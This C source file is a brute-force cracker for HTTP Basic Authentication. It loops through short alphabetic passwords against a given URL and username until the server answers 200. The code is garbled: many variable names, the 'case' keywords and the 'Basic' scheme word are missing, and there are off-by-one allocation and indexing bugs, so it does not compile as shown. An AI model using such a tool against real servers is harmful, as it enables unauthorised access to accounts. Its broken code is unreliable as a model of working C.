



#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <netdb.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>

#define BUFFER_SIZE 2000
#define RETURN_OK 0
#define RETURN_ERROR 1
#define TRUE  1
#define FALSE 0
#define PASSWORD_LENGTH 3

#define STATUS_OK            200
#define STATUS_AUTH_REQUIRED 401
#define CONN_CLOSED          2


char *host;
char *filename;
int  ;
char *url;
char *username;
int attempt;
struct sockaddr_in serverAddr;


void processArguments(int, char **argv, char **, char **);
void printUsage(char *);
void splitURL(const char *, char **, char **);
int openConnection();
void initialiseConnection();
void sendRequest(int, char *, char *, char *, char *);
int getResponseStatus(int);
void base64_encode(const unsigned char *, unsigned char *);
void getHostErrorMsg(char *);
void generatePassword(char *, int);
void testPassword(char *);




int main(int argc, char *argv[])
{
    char password[PASSWORD_LENGTH+1];
    int i;

    

    attempt = 0;
    processArguments(argc, argv, &url, &username);
    splitURL(url, &host, &filename);

    initialiseConnection();
     = openConnection();

    

    for (i=1; i<=PASSWORD_LENGTH; i++)
    {
        memset(password, 0, PASSWORD_LENGTH+1);
        generatePassword(password, i);
    }

    printf("The password has not been cracked\n");
    exit(RETURN_OK);

}




void generatePassword(char *password, int reqLength)
{
    static const char *chars = 
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    int currLength;
    int i;

    currLength = strlen(password);
    currLength++;

    for (i=0; i<strlen(chars); i++)
    {
        password[currLength-1] = chars[i];

        if (strlen(password) != reqLength)
        {
           
           generatePassword(password, reqLength);
        }
        else
        {
           testPassword(password);
        }

        password[currLength] = '\0';
    }
}




void testPassword(char *password)
{
    int status;

    attempt++;

    
TestPassword:
    sendRequest(, host, filename, username, password);
    status = getResponseStatus();

    if (status == STATUS_OK)
    {
        printf("The password has been found after %d attempts: %s\n",
               attempt, password);
        exit(RETURN_OK);
    }
    else if (status == CONN_CLOSED)
    {
        
        ();
         = openConnection();
        goto TestPassword;        
    }
    else if (status != STATUS_AUTH_REQUIRED)
    {
        printf("Status %d received from server\n", status);
        exit(RETURN_ERROR);
    }

}




void processArguments(int argc, char *argv[], char **url, char **username)
{
    if (argc != 3)
    {
        printUsage(argv[0]);
        exit(1);
    }

    *url = (char *) malloc(strlen(argv[1] + 1));
    strcpy(*url, argv[1]);

    *username = (char *) malloc(strlen(argv[2] + 1));
    strcpy(*username, argv[2]);

}





void printUsage(char *program)
{
    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "%s url username\n", program);
}




void splitURL(const char *url, char **host, char **file)
{
    char *p1; 
    char *p2;

    
    p1 = strstr(url, "//");
    if (p1 == NULL)
        p1 = (char *) url;
    else
        p1 = p1 + 2;

    
    p2 = strstr(p1, "/");
    if (p2 == NULL)
    {
        fprintf(stderr, "Invalid url\n");
        exit(RETURN_ERROR);
    }

    *host = (char *) malloc(p2-p1+2);
    strncpy(*host, p1, p2-p1);
    (*host)[p2-p1] = '\0';

    *file = (char *) malloc(strlen(p2+1));
    strcpy(*file, p2);

}




void sendRequest(int , char *host, char *filename, char *username, 
                 char *password)
{
    char message[BUFFER_SIZE];
    unsigned char encoded[BUFFER_SIZE];
    unsigned char token[BUFFER_SIZE];

    

    
    sprintf((char *) token, "%s:%s", username, password);
    base64_encode(token, encoded);

    sprintf(message, "GET %s HTTP/1.1\nHost: %s\nAuthorization:  %s\n\n",
            filename, host, encoded);

    if (write(, message, strlen(message)) == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }
}




int getResponseStatus()
{
    char message[BUFFER_SIZE];
    int  bytesRead;
    char *p1;
    char status_str[4];
    int  status;

    

    while (TRUE)
    {
        bytesRead = (, message, BUFFER_SIZE-1);
        if (bytesRead == -1)
        {
            perror("");
            exit(RETURN_ERROR);
        }
        else if (bytesRead == 0)
        {
            
            return CONN_CLOSED;
        }

        message[bytesRead+1] = '\0';

        
        p1 = strstr(message, "HTTP");
        if (p1 != NULL)
        {
            p1 = p1 + 9;
            break;
        }
    }

    strncpy(status_str, p1, 3);
    status_str[3] = '\0';
    status = atol(status_str);

    return status;
}




int openConnection()
{
    int ;

    if (( = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }

    if (connect(, (struct sockaddr *) &serverAddr, sizeof(serverAddr)) == -1)
    {
        perror("connect");
        exit(RETURN_ERROR);
    }

    return ;
}




void initialiseConnection()
{
    struct hostent *serverHostent;
    unsigned  serverIP;
    char errorMsg[BUFFER_SIZE]; 


    

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_port = htons(80);


    if ((serverIP = inet_addr(host)) != -1)
    {
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = serverIP;
    }
    else if ((serverHostent = gethostbyname(host)) != NULL)
    {
	serverAddr.sin_family = serverHostent->h_addrtype;
        memcpy((void *) &serverAddr.sin_addr,
		 (void *) serverHostent->h_addr, serverHostent->h_length);
    }
    else
    {
       getHostErrorMsg(errorMsg);
       printf("%s: %s\n", host, errorMsg);
       exit(RETURN_ERROR);
    }
}



 
void base64_encode(const unsigned char *input, unsigned char *output)
{
    static const char *codes = 
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    int i;
    int len;
    int lenfull;
    unsigned char *p;
    int a;
    int b;
    int c;
    
    p = output;
    len = strlen((char *) input);

    

    lenfull = 3*(len / 3);
    for (i = 0; i < lenfull; i += 3) 
    {
        *p++ = codes[input[0] >> 2];
        *p++ = codes[((input[0] & 3) << 4) + (input[1] >> 4)];
        *p++ = codes[((input[1] & 0xf) << 2) + (input[2] >> 6)];
        *p++ = codes[input[2] & 0x3f];
        input += 3;
    }


    

    if (i < len)
    {
        a = input[0];
        b = (i+1 < len) ? input[1] : 0;
        c = 0;

        *p++ = codes[a >> 2];
        *p++ = codes[((a & 3) << 4) + (b >> 4)];
        *p++ = (i+1 < len) ? codes[((b & 0xf) << 2) + (c >> 6)] : '=';
        *p++ = '=';
    }

    
    *p = '\0';
 
}




void getHostErrorMsg(char *message)
{
    switch (h_errno)
    {
         HOST_NOT_FOUND :
             strcpy(message, "The specified host is unknown");
             break;

         NO_DATA:
             strcpy(message, "The specified host name is valid, but does not have   address");
             break;

         NO_RECOVERY:
             strcpy(message, "A non-recoverable name server error occurred");
             break;

         TRY_AGAIN:
             strcpy(message, "A temporary error occurred   authoritative name server. Try again later.");
             break;

        default:
             strcpy(message, " unknown name server error occurred.");
    }
}

